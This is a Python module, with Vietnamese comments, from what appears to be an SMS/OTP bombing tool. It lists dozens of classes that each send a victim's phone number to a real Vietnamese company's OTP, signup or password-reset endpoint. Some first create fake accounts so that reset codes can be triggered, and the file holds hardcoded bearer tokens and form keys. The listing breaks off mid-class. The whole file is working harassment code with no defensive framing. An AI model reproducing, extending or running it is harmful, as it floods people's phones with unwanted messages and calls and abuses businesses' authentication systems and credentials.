"""
services/all_services.py — Danh sách toàn bộ các OTP services của dự án.
Được gom vào 1 file duy nhất để tránh phân mảnh file theo yêu cầu của người dùng.
"""

import random
import string
from core.base_service import Service, ServiceResult


def generate_random_email(domain='example.com'):
    length = random.randint(5, 10)
    email_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    return f'{email_name}@{domain}'


# =====================================================================
# ===== CATEGORY: STREAMING (Dịch vụ giải trí, xem truyền hình) =====
# =====================================================================

class TV360(Service):
    name = "TV360"
    category = "streaming"
    active = True
    description = "Viettel TV360 - OTP đăng nhập"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://tv360.vn/public/v1/auth/get-otp-login',
            headers={
                'accept': 'application/json, text/plain, */*',
                'content-type': 'application/json',
                'origin': 'https://tv360.vn',
                'referer': 'https://tv360.vn/login',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            },
            json={'msisdn': phone},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class VieON(Service):
    name = "VieON"
    category = "streaming"
    active = True
    description = "VieON - OTP đăng ký"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://api.vieon.vn/backend/user/v2/register',
            params={'platform': 'web', 'ui': '012021'},
            headers={
                'accept': 'application/json, text/plain, */*',
                'content-type': 'application/json',
                'origin': 'https://vieon.vn',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            },
            json={
                'username': phone,
                'country_code': 'VN',
                'model': 'Windows 10',
                'device_id': '2528bad71bbbf988882aa72fdb105384',
                'device_name': 'Chrome',
                'device_type': 'desktop',
                'platform': 'web',
                'ui': '012021',
            },
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class MyTV(Service):
    name = "MyTV"
    category = "streaming"
    active = True
    description = "VNPT MyTV - OTP đăng nhập"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://apigw.mytv.vn/api/v1/authen-handle/sendOTP?&uuid=64e8c0d4-c73b-4158-8513-ca4519d9e826',
            headers={
                'Content-Type': 'application/json',
                'Origin': 'https://mytv.com.vn',
                'Referer': 'https://mytv.com.vn/',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Macaddress': '1efca607-2227-610e-9234-109156bec4fb',
            },
            json={
                'device_model': 'Browser',
                'device_type': 127,
                'email': '',
                'login_type': '1',
                'phone': phone,
                'type': '1',
            },
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


# =====================================================================
# ===== CATEGORY: TELECOM (Dịch vụ viễn thông, SMS/OTP nhà mạng) =====
# =====================================================================

class MyViettel(Service):
    name = "MyViettel"
    category = "telecom"
    active = True
    description = "MyViettel - OTP đăng nhập"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            f'https://apigami.viettel.vn/mvt-api/myviettel.php/getOTPLoginCommon?lang=vi&phone={phone}&actionCode=myviettel:%2F%2Flogin_mobile&typeCode=DI_DONG&type=otp_login',
            headers={
                'accept': 'application/json, text/plain, */*',
                'origin': 'https://vietteltelecom.vn',
                'referer': 'https://vietteltelecom.vn/',
                'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36',
            },
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class VTTelecom(Service):
    name = "VTTelecom"
    category = "telecom"
    active = True
    description = "Viettel Telecom - OTP đăng ký"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        # Step 1: getOtp
        self.session.post(
            'https://apigami.viettel.vn/mvt-api/myviettel.php/getOtp',
            params={'lang': 'vi', 'msisdn': phone, 'type': 'register'},
            headers={
                'accept': 'application/json, text/plain, */*',
                'origin': 'https://vietteltelecom.vn',
                'referer': 'https://vietteltelecom.vn/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            },
            timeout=self.config["http"]["timeout"],
        )
        # Step 2: getOTPLoginCommon
        response = self.session.post(
            f'https://apigami.viettel.vn/mvt-api/myviettel.php/getOTPLoginCommon?lang=vi&phone={phone}&actionCode=myviettel:%2F%2Flogin_mobile&typeCode=DI_DONG&type=otp_login',
            headers={
                'accept': 'application/json, text/plain, */*',
                'origin': 'https://vietteltelecom.vn',
                'referer': 'https://vietteltelecom.vn/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            },
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class Mocha(Service):
    name = "Mocha"
    category = "telecom"
    active = True
    description = "Mocha Video - OTP đăng nhập"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp',
            params={'msisdn': phone, 'languageCode': 'vi'},
            headers={
                'Accept': 'application/json, text/plain, */*',
                'Origin': 'https://video.mocha.com.vn',
                'Referer': 'https://video.mocha.com.vn/',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            },
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class Mocha2(Service):
    name = "Mocha2"
    category = "telecom"
    active = True
    description = "Mocha app - OTP v33"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'http://hlvip.mocha.com.vn:80/ReengBackendBiz/genotp/v33',
            headers={
                'User-Agent': 'mocha/6.00 (iPhone; iOS 17.4.1; Scale/2.00)',
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            data={
                'clientType': 'ios', 'countryCode': 'VN', 'device': 'iPhone 14',
                'os_version': 'iOS_18', 'platform': 'ios', 'revision': '11731',
                'username': phone, 'version': '6.00',
            },
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class Mocha35(Service):
    name = "Mocha35"
    category = "telecom"
    active = True
    description = "Mocha35 - OTP v32"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://v2sslapimocha35.mocha.com.vn/ReengBackendBiz/genotp/v32',
            headers={
                'User-Agent': 'mocha/1.31 (iPhone; iOS 17.4.1; Scale/2.00)',
                'Content-Type': 'application/x-www-form-urlencoded',
                'APPNAME': 'MC35',
            },
            data={
                'clientType': 'ios', 'countryCode': 'VN', 'device': 'iPhone11,8',
                'os_version': 'iOS_17.4.1', 'platform': 'ios', 'revision': '11235',
                'username': phone, 'version': '1.31',
            },
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


# =====================================================================
# ===== CATEGORY: ECOMMERCE (Thương mại điện tử, Mua sắm, Thời trang) =====
# =====================================================================

class FPTShop(Service):
    name = "FPTShop"
    category = "ecommerce"
    active = True
    description = "FPT Shop - OTP xác thực"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://papi.fptshop.com.vn/gw/is/user/new-send-verification',
            headers={
                'Content-Type': 'application/json',
                'Referer': 'https://fptshop.com.vn/',
                'apptenantid': 'E6770008-4AEA-4EE6-AEDE-691FD22F5C14',
                'order-channel': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            },
            json={'fromSys': 'WEBKHICT', 'otpType': '0', 'phoneNumber': phone},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class Hasaki(Service):
    name = "Hasaki"
    category = "ecommerce"
    active = True
    description = "Hasaki.vn - OTP xác thực (mobile API)"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.get(
            'https://api.hasaki.vn/mobile/v3/user/get-code-verify',
            params={'username': phone},
            headers={
                'content-type': 'application/json; charset=utf-8',
                'mobileappversion': '2.3.87',
                'mobileregion': 'VN',
                'accept': 'application/json',
                'mobileplatform': 'ios',
                'user-agent': 'Hasaki.vn/1 CFNetwork/1335.0.3.4 Darwin/21.6.0',
            },
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class Fahasa(Service):
    name = "Fahasa"
    category = "ecommerce"
    active = True
    description = "Fahasa - kiểm tra số điện thoại"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://www.fahasa.com/ajaxlogin/ajax/checkPhone',
            headers={
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://www.fahasa.com',
                'x-requested-with': 'XMLHttpRequest',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            },
            data={'phone': phone},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class BiboMart(Service):
    name = "BiboMart"
    category = "ecommerce"
    active = True
    description = "BiboMart - OTP đăng ký"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://prod.bibomart.net/customer_account/v2/otp/send',
            headers={
                'accept': 'application/json, text/plain, */*',
                'content-type': 'application/json',
                'origin': 'https://bibomart.com.vn',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            },
            json={'phone': phone, 'type': 1},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class Liena(Service):
    name = "Liena"
    category = "ecommerce"
    active = True
    description = "Liena.com.vn - OTP đăng nhập"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://www.liena.com.vn/rest/V1/liena/customer/login/request-otp',
            headers={
                'accept': 'application/json',
                'content-type': 'application/json',
                'origin': 'https://www.liena.com.vn',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            },
            json={'phone_number': phone},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class AIO(Service):
    name = "AIO"
    category = "ecommerce"
    active = True
    description = "AIO Smart - OTP đăng ký"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://aiosmart.com.vn/advancedlogin/login/sendOtpRegister/',
            headers={
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://aiosmart.com.vn',
                'x-requested-with': 'XMLHttpRequest',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            },
            data={
                'login[otp]': '', 'login[telephone]': phone,
                'login[username]': 'User', 'confirm': 'on',
                'form_key': '2t5QRPIHEoET1XqG',
            },
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class HoangPhuc(Service):
    name = "HoangPhuc"
    category = "ecommerce"
    active = True
    description = "Hoàng Phúc Online - OTP đăng ký"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://hoangphuconline.vn/advancedlogin/otp/CheckValii/',
            headers={
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://hoangphuconline.vn',
                'referer': 'https://hoangphuconline.vn/customer/account/create/',
                'user-agent': 'Mozilla/5.0',
                'x-requested-with': 'XMLHttpRequest',
            },
            data={
                'action_type': '1',
                'tel': phone,
                'form_key': 'JTtX1a62gBu8U3UN',
            },
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class KKFashion(Service):
    name = "KKFashion"
    category = "ecommerce"
    active = True
    description = "KK Fashion - OTP quên mật khẩu"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        email = generate_random_email()
        self.session.post(
            'https://www.kkfashion.vn/dang-nhap',
            params={'create_account': '1'},
            headers={
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.kkfashion.vn',
                'referer': 'https://www.kkfashion.vn/dang-nhap?create_account=1',
                'user-agent': 'Mozilla/5.0',
            },
            data={
                'username': 'tran dat',
                'phone': phone,
                'email': email,
                'password': '123123aA@',
                'city': 'Thành phố Cần Thơ',
                'district': 'Huyện Cờ Đỏ',
                'ward': 'Thới Xuân',
                'address2': 'Thới Xuân - Huyện Cờ Đỏ',
                'address1': '22 tan te3 ',
                'submitCreate': '1',
            },
            timeout=self.config["http"]["timeout"],
        )
        response = self.session.post(
            'https://www.kkfashion.vn/module/nj_sms/forgotPassword',
            headers={
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://www.kkfashion.vn',
                'referer': 'https://www.kkfashion.vn/khoi-phuc-mat-khau',
                'user-agent': 'Mozilla/5.0',
                'x-requested-with': 'XMLHttpRequest',
            },
            data={'phone': phone, 'otpcode': ''},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


# =====================================================================
# ===== CATEGORY: FNB (Thực phẩm và Đồ uống, Đặt đồ ăn) =====
# =====================================================================

class BeFood(Service):
    name = "BeFood"
    category = "fnb"
    active = True
    description = "Be Food - OTP đăng nhập"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://gw.be.com.vn/api/v1/be-delivery-gateway/user/login',
            headers={
                'accept': '*/*',
                'content-type': 'application/json',
                'origin': 'https://food.be.com.vn',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            },
            json={
                'phone_no': phone_intl,
                'uuid': '6b83df66-d9ad-4ef0-86d9-a235c5e83aa7',
                'is_from_food': True, 'is_forgot_pin': False,
                'locale': 'vi', 'app_version': '11261', 'version': '1.1.261',
                'device_type': 3,
            },
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class TheCoffeeHouse(Service):
    name = "TheCoffeeHouse"
    category = "fnb"
    active = True
    description = "The Coffee House - OTP đăng nhập"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://api.thecoffeehouse.com/api/v5/auth/request-otp',
            headers={
                'Accept': 'application/json',
                'Content-Type': 'application/json; charset=utf-8',
                'User-Agent': '(iPhone7; iOS 15.8.2)',
                'TCH-APP-VERSION': '5.9.31',
                'TCH-DEVICE-ID': '07656846-4793-4232-8209-B756630A7277',
            },
            json={'phone': {'phone_number': phone, 'region_code': '+84'}},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class Highlands(Service):
    name = "Highlands"
    category = "fnb"
    active = True
    description = "Highlands Coffee - OTP đăng nhập"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://api-app.highlandscoffee.com.vn/api/v3/authentication/otp/send',
            headers={
                'content-type': 'application/json',
                'accept': 'application/json',
                'user-agent': 'PendoGO/4.1.15 (com.vti.highlands; build:1; iOS 15.8.2) Alamofire/5.9.1',
            },
            json={'UserAccount': phone_intl},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class GoldenSpoonsZL(Service):
    name = "GoldenSpoonsZL"
    category = "fnb"
    active = True
    description = "Golden Spoons - OTP via Zalo"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://backend2.tgss.vn/2e55ad4eb9ad4631b65efe18710b6feb/otp/send',
            headers={
                'accept': 'application/json, text/plain, */*',
                'content-type': 'application/json',
                'origin': 'https://goldenspoons.com.vn',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            },
            json={'phoneNumber': phone, 'type': 1, 'language': 1, 'provider': 2},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class GoldenSpoonsSMS(Service):
    name = "GoldenSpoonsSMS"
    category = "fnb"
    active = True
    description = "Golden Spoons - OTP via SMS"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://backend2.tgss.vn/2e55ad4eb9ad4631b65efe18710b6feb/otp/send',
            headers={
                'accept': 'application/json, text/plain, */*',
                'content-type': 'application/json',
                'origin': 'https://goldenspoons.com.vn',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            },
            json={'phoneNumber': phone, 'type': 1, 'language': 1, 'provider': 1},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class IlokaFood(Service):
    name = "IlokaFood"
    category = "fnb"
    active = True
    description = "Iloka Food - OTP Zalo"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'http://back.iloka.vn:9999/api/v2/customer/sentZaloOTP',
            headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
            json={'phone': phone},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class FoodHubZL(Service):
    name = "FoodHubZL"
    category = "fnb"
    active = True
    description = "FoodHub - OTP via Zalo"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://account.ab-id.net/auth/get_form_phone_code',
            headers={
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://account.ab-id.net',
                'User-Agent': 'Mozilla/5.0',
            },
            data={
                'access_token': '73f53f54d63b6caa9fb7b90f0007b72a52be1849b00a35d599fb002c22701563',
                'destination': 'https://www.foodhub.vn',
                'phone_number': phone,
                'remember_account': '1',
                'type': 'zalootp',
                'country': '+84',
                'country_code': 'VN',
            },
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class GoldenSpoonsZLResend(Service):
    name = "GoldenSpoonsZLResend"
    category = "fnb"
    active = True
    description = "Golden Spoons - Resend OTP Zalo"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://backend2.tgss.vn/2e55ad4eb9ad4631b65efe18710b6feb/otp/resend',
            headers={
                'accept': 'application/json, text/plain, */*',
                'content-type': 'application/json',
                'origin': 'https://goldenspoons.com.vn',
                'user-agent': 'Mozilla/5.0',
            },
            json={'phoneNumber': phone, 'type': 1, 'language': 1, 'provider': None},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class GoldenSpoonsSMSResend(Service):
    name = "GoldenSpoonsSMSResend"
    category = "fnb"
    active = True
    description = "Golden Spoons - Resend OTP SMS"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://backend2.tgss.vn/2e55ad4eb9ad4631b65efe18710b6feb/otp/resend',
            headers={
                'accept': 'application/json, text/plain, */*',
                'content-type': 'application/json',
                'origin': 'https://goldenspoons.com.vn',
                'user-agent': 'Mozilla/5.0',
            },
            json={'phoneNumber': phone, 'type': 1, 'language': 1, 'provider': 1},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


# =====================================================================
# ===== CATEGORY: DELIVERY (Giao hàng, Vận chuyển, Xe ôm công nghệ) =====
# =====================================================================

class ViettelPost(Service):
    name = "ViettelPost"
    category = "delivery"
    active = True
    description = "ViettelPost - OTP đăng ký"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://id.viettelpost.vn/Account/SendOTPByPhone',
            headers={
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            },
            data={
                'FormRegister.Phone': phone,
                'FormRegister.FullName': 'User Test',
                'FormRegister.Password': '123123aA',
                'FormRegister.ConfirmPassword': '123123aA',
                'FormRegister.IsRegisterFromPhone': 'True',
                'ConfirmOtpType': 'Register',
            },
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class AhaMove(Service):
    name = "AhaMove"
    category = "delivery"
    active = True
    description = "AhaMove - OTP đăng nhập"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        # Step 1: Register
        email = generate_random_email()
        self.session.post(
            'https://api.ahamove.com/api/v3/public/supplier/register',
            headers={'content-type': 'application/json', 'user-agent': 'OnWheel_Supplier'},
            data=f'{{"name":"user","email":"{email}","mobile":"{phone}","country_code":"VN"}}',
            timeout=self.config["http"]["timeout"],
        )
        # Step 2: Login OTP
        formatted = f'{phone[0:3]} {phone[3:7]} {phone[7:10]}'
        response = self.session.post(
            'https://api.ahamove.com/api/v3/public/supplier/login',
            headers={'content-type': 'application/json', 'user-agent': 'OnWheel_Supplier'},
            json={'mobile': formatted, 'resend': False},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class JupViec(Service):
    name = "JupViec"
    category = "delivery"
    active = True
    description = "JupViec - OTP đăng nhập"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://wondermaid.jupviec.vn/api/account/send-otp',
            headers={
                'Content-Type': 'application/json; charset=UTF-8',
                'Accept': 'application/json',
                'User-Agent': 'JupViec/1734778835 CFNetwork/1494.0.7 Darwin/23.4.0',
            },
            json={'phone': phone, 'countryCode': '+84'},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class GhePhang(Service):
    name = "GhePhang"
    category = "delivery"
    active = True
    description = "GhePhang - OTP SMS"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.get(
            'https://quanly.ghephang.com/gh/api_driver/send_otp_v2.json',
            params={'phone': phone, 'id_device': 'CFAA3646-4D74-43A4-ADAC-4240BBAF87BF', 'zalo': '0'},
            headers={'Accept': 'application/json, text/plain, */*', 'User-Agent': 'GhepHangKhachHang/22 CFNetwork/1494.0.7 Darwin/23.4.0'},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class GhePhangZL(Service):
    name = "GhePhangZL"
    category = "delivery"
    active = True
    description = "GhePhang - OTP Zalo"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.get(
            'https://quanly.ghephang.com/gh/api_driver/send_otp_v2.json',
            params={'phone': phone, 'id_device': 'CFAA3646-4D74-43A4-ADAC-4240BBAF87BF', 'zalo': '1'},
            headers={'Accept': 'application/json, text/plain, */*', 'User-Agent': 'GhepHangKhachHang/22 CFNetwork/1494.0.7 Darwin/23.4.0'},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class GHTK(Service):
    name = "GHTK"
    category = "delivery"
    active = True
    description = "Giaohangtietkiem - OTP quên mật khẩu"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        self.session.post(
            'https://web.giaohangtietkiem.vn/api/v1/register-shop/create-register-shop',
            headers={
                'apptype': 'Web',
                'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MzM1MDIzNSwidGVsIjoiMDM1NzE1NjMyMiIsImVtYWlsIjoiNjZiMzNmYTRmMjNjNEBnaHRrLmlvIiwiYWNjZXNzX3Rva2VuIjpudWxsLCJqd3QiOm51bGwsImludmFsaWRfYXQiOnsiZGF0ZSI6IjIwMjQtMDgtMTQgMTY6MzQ6MjguOTk1NjkwIiwidGltZXpvbmVfdHlwZSI6MywidGltZXpvbmUiOiJBc2lhXC9Ib19DaGlfTWluaCJ9fQ.nr08Xjl1uhmrMZAaDu3BBO5PPhyBnroiTD9SOrw1hgc',
                'content-type': 'application/json',
                'user-agent': 'Mozilla/5.0',
            },
            json={
                'name': 'GTC Shop',
                'tel': phone,
                'password': '123123aA@',
                'confirm_password': '123123aA@',
                'first_address': '12 BC TIn',
                'province': 'An Giang', 'province_id': '833',
                'district': 'Huyện Châu Phú', 'district_id': '1470',
                'ward': 'Xã Bình Long', 'ward_id': '16579',
                'hamlet': 'Ấp Bình Chiến', 'hamlet_id': '114065',
            },
            timeout=self.config["http"]["timeout"],
        )
        response = self.session.post(
            'https://web.giaohangtietkiem.vn/api/v1/shop/password/send-otp',
            headers={
                'apptype': 'Web',
                'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MzM1MDIzNywidGVsIjoiMDM1NzE1NjMyMSIsImVtYWlsIjoiNjZiMzNmYzVjOGI2MkBnaHRrLmlvIiwiYWNjZXNzX3Rva2VuIjpudWxsLCJqd3QiOm51bGwsImludmFsaWRfYXQiOnsiZGF0ZSI6IjIwMjQtMDgtMTQgMTY6MzU6MDEuODI2MDUwIiwidGltZXpvbmVfdHlwZSI6MywidGltZXpvbmUiOiJBc2lhXC9Ib19DaGlfTWluaCJ9fQ.th7fjWe_Z1_Aag1RQlDwQ_Q82k1cUkVrghVeJWIHqGI',
                'content-type': 'application/json',
                'user-agent': 'Mozilla/5.0',
            },
            json={
                'username': phone,
                'card_images': [
                    {'url': 'https://cache.giaohangtietkiem.vn/d/e569e3e6683d23d7de857156622c3703.png', 'image_order': 1},
                    {'url': 'https://cache.giaohangtietkiem.vn/d/e8bd8e58171021dcb1bcac57487acf2e.png', 'image_order': 2},
                ],
            },
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


# =====================================================================
# ===== CATEGORY: FINANCE (Tài chính, Chứng khoán, Đầu tư) =====
# =====================================================================

class VNSC(Service):
    name = "VNSC"
    category = "finance"
    active = True
    description = "Vina Securities - OTP xác thực"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://api.vinasecurities.com/auth/v1/otp',
            headers={
                'accept': 'application/json, text/plain, */*',
                'content-type': 'application/json',
                'origin': 'https://invest.vnsc.vn',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            },
            json={'type': 'PHONE_VERIFICATION_OTP', 'phone': phone, 'email': ''},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class VietMoney(Service):
    name = "VietMoney"
    category = "finance"
    active = True
    description = "VietMoney - OTP đăng ký (SMS)"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://gateway.vietmoney.vn/digital-svc/v1/auth/signup',
            headers={
                'accept': 'application/json, text/plain, */*',
                'content-type': 'application/json',
                'user-agent': 'VietMoney/166 CFNetwork/1335.0.3.4 Darwin/21.6.0',
            },
            json={'phone': phone, 'otpMethod': 'sms'},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class VietMoneyCall(Service):
    name = "VietMoneyCall"
    category = "finance"
    active = True
    description = "VietMoney - OTP cuộc gọi"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://gateway.vietmoney.vn/digital-svc/v1/auth/signup',
            headers={
                'accept': 'application/json, text/plain, */*',
                'content-type': 'application/json',
                'user-agent': 'VietMoney/166 CFNetwork/1335.0.3.4 Darwin/21.6.0',
            },
            json={'phone': phone, 'otpMethod': 'call'},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class SFin(Service):
    name = "SFin"
    category = "finance"
    active = True
    description = "SFin/SShop - OTP đăng ký"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://proapi.sspa.com.vn/auth/v2/otp/generate-v2',
            headers={
                'Content-Type': 'application/json',
                'User-Agent': 'sshop/4 CFNetwork/1494.0.7 Darwin/23.4.0',
                'appid': 'SSHOP', 'appversion': '1.248',
            },
            json={
                'username': f'84{phone[1:10]}',
                'type': 'REGISTRATION',
                'appId': 'SSHOP',
                'languageCode': 'vi',
            },
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


# =====================================================================
# ===== CATEGORY: EDUCATION (Giáo dục, Học tập trực tuyến) =====
# =====================================================================

class VuiHoc(Service):
    name = "VuiHoc"
    category = "education"
    active = True
    description = "VuiHoc - OTP đăng nhập"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://api.vuihoc.vn/api/send-otp',
            headers={
                'accept': 'application/json, text/plain, */*',
                'content-type': 'application/json',
                'origin': 'https://vuihoc.vn',
                'app-id': '3',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            },
            json={'mobile': phone},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class PrepEdu(Service):
